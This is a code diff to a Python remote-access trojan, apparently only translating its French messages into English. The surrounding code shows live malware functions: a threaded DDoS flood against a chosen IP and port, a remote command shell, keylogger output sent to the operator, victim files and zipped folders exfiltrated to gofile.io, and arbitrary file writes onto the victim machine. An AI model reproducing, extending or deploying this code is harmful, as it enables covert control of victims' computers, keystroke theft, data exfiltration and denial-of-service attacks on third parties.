@@ -204,18 +204,18 @@ def ddos(conn: socket.socket, ip: str = ""):
             return
         try:
             if ip:
-                send_message(conn, f"Attaque démarrée pour {pc_name} sur {ip} sur le port {port} pendant {temps} secondes.".encode())
+                send_message(conn, f"DDOS attack started for {pc_name} on {ip}:{port} during {temps} seconds.".encode())
                 nb_attacks = 0
                 for _ in range(50):
                     threading.Thread(target=spam_url_ip, args=(ip, port, temps)).start()
                 time.sleep(temps + 5)
-                send_message(conn, f"L'attaque DDOS est finie pour l'ordinateur **{pc_name.upper()}**, Nombre de requetes réussi : {nb_attacks}.".encode())
+                send_message(conn, f"The DDOS attack is over for **{pc_name.upper()}**, Number of successful requests : {nb_attacks}.".encode())
             else:
-                send_message(conn, b"Veuillez specifier une adresse IP valide.")
+                send_message(conn, b"Please specify a valid IP address.")
         except Exception as e:
-            send_message(conn, f"Une erreur est survenue : {e}".encode())
+            send_message(conn, f"An error occured : {e}".encode())
     except Exception as e:
-        send_message(conn, f"Une erreur est survenue : {e}".encode())
+        send_message(conn, f"An error occured : {e}".encode())
 
 def shell(conn: socket.socket, command: str):
     if command.startswith("cd"):
@@ -223,7 +223,7 @@ def shell(conn: socket.socket, command: str):
             os.chdir(command[3:])
             send_message(conn, os.getcwd().encode())
         except Exception as e:
-            send_message(conn, f"Erreur: {e}".encode())
+            send_message(conn, f"Error: {e}".encode())
     else:
         enc = locale.getpreferredencoding(False)
         output = subprocess.run(
@@ -271,20 +271,20 @@ def message(conn: socket.socket, content: str):
     try:
         parts = content.split("::")
         if len(parts) != 3:
-            send_message(conn, b"Incorreect format. Usage : !message <Title>::<Message>::<Icon>")
+            send_message(conn, b"Incorrect format. Usage : !message <Title>::<Message>::<Icon>")
             return
         title, msg, icon = parts
         threading.Thread(target=show_message, args=(title, msg, icon)).start()
         send_message(conn, b"Message sent !")
     except Exception as e:
-        send_message(conn, f"Une erreur est survenue : {e}".encode())
+        send_message(conn, f"An error occured : {e}".encode())
 
 def keylogger(conn: socket.socket):
     try:
         with open(key_logger_file, "rb") as f:
             send_message(conn, f.read())
     except Exception as e:
-            send_message(conn, f"Une erreur est survenue {e}".encode())
+            send_message(conn, f"An error occured {e}".encode())
 
 def download(conn: socket.socket, file_path: str = None):
     try:
@@ -292,39 +292,39 @@ def download(conn: socket.socket, file_path: str = None):
             if os.path.exists(file_path):
                 if os.path.isdir(file_path):
                     try:
-                        send_message(conn, b"Transformation du dossier en zip...")
+                        send_message(conn, b"Converting the folder to a zip file...")
                         zip_location = os.path.join(tempFolder, file_path.split("\\")[-1] + ".zip")
                         send_message(conn, zip_location.encode())
                         compresser_dossier_vers_zip(file_path, zip_location)
-                        send_message(conn, f"Taille du zip : {round(os.stat(zip_location).st_size / (1024 * 1024), 2)} Mo ?".encode())
-                        send_message(conn, b"Telechargement en cours... Ca va prendre du temps")
+                        send_message(conn, f"Zip size : {round(os.stat(zip_location).st_size / (1024 * 1024), 2)} Mo ?".encode())
+                        send_message(conn, b"Downloading... This will take some time")
                         with open(zip_location, "rb") as f:
                             response = requests.post("https://upload.gofile.io/uploadFile", files={"file": f}).json()
                         if response["status"] == "ok":
                             download_link = response["data"]["downloadPage"]
-                            send_message(conn, f"Lien de telechargement : {download_link}".encode())
+                            send_message(conn, f"Download link : {download_link}".encode())
                         else:
-                            send_message(conn, b"Erreur lors de l'upload.")
+                            send_message(conn, b"Error during upload.")
                     except Exception as e:
-                        send_message(conn, f"Une erreur est survenue : {e}".encode())
+                        send_message(conn, f"An error occured : {e}".encode())
                     finally:
                         os.remove(zip_location)
                 else:
-                    send_message(conn, b"Telechargement en cours...")
+                    send_message(conn, b"Downloading...")
                     with open(file_path, "rb") as f:
                         response = requests.post("https://upload.gofile.io/uploadFile", files={"file": f}).json()
                     
                     if response["status"] == "ok":
                         download_link = response["data"]["downloadPage"]
-                        send_message(conn, f"Lien de telechargement : {download_link}".encode())
+                        send_message(conn, f"Download link : {download_link}".encode())
                     else:
-                        send_message(conn, b"Erreur lors de l'upload.")
+                        send_message(conn, b"Error during uploadd.")
             else:
-                send_message(conn, b"Le chemin du fichier est invalide.")
+                send_message(conn, b"The file path is invalid.")
         else:
-            send_message(conn, b"Veuillez entrer un chemin valide !")
+            send_message(conn, b"Please enter a valid path!")
     except Exception as e:
-        send_message(conn, f"Une erreur est survenue : {e}".encode())
+        send_message(conn, f"An error occured : {e}".encode())
 
 def on_ready():
     global canKeyLogger
@@ -336,17 +336,17 @@ def volume(conn: socket.socket, volume):
         volume = int(volume)
         try:
             set_volume(volume)
-            send_message(conn, f"Le volume a bien ete change a {volume}".encode())
+            send_message(conn, f"The volume has been changed to {volume} %".encode())
         except Exception as e:
-            send_message(conn, f"Une erreur est survenue lors du changement du volume : {e}".encode())
+            send_message(conn, f"An error occurred while changing the volume : {e}".encode())
     except ValueError:
-        send_message(conn, b"Valeur de volume invalide")
+        send_message(conn, b"Invalid volume value")
 
 def upload(conn: socket.socket, data: bytes):
     try:
         parts = data.split(b"::", 2)
         if len(parts) < 3:
-            send_message(conn, b"Format invalide. Attendu: path::filename::binaire")
+            send_message(conn, b"Invalid format. Expected format: path::filename::binaire")
             return
 
         raw_path = parts[0].decode(errors="ignore")
@@ -371,9 +371,9 @@ def upload(conn: socket.socket, data: bytes):
         with open(file_path, "wb") as f:
             f.write(filecontent)
 
-        send_message(conn, b"Fichier enregistre avec succes.")
+        send_message(conn, b"File saved successfully.")
     except Exception as e:
-        send_message(conn, f"Une erreur est survenue : {e}".encode())
+        send_message(conn, f"An error occured : {e}".encode())
 
 def handle_command(ssock: socket.socket, res: str):
     if res == "ping":
@@ -393,7 +393,7 @@ def handle_command(ssock: socket.socket, res: str):
     elif res.startswith("download"):
         threading.Thread(target=download, args=(ssock, res[9:],), daemon=True).start()
     else:
-        send_message(ssock, f"[!] Commande non reconnue : {res}".encode())
+        send_message(ssock, f"[!] Unrecognized command : {res}".encode())
 
 def main():
     on_ready()
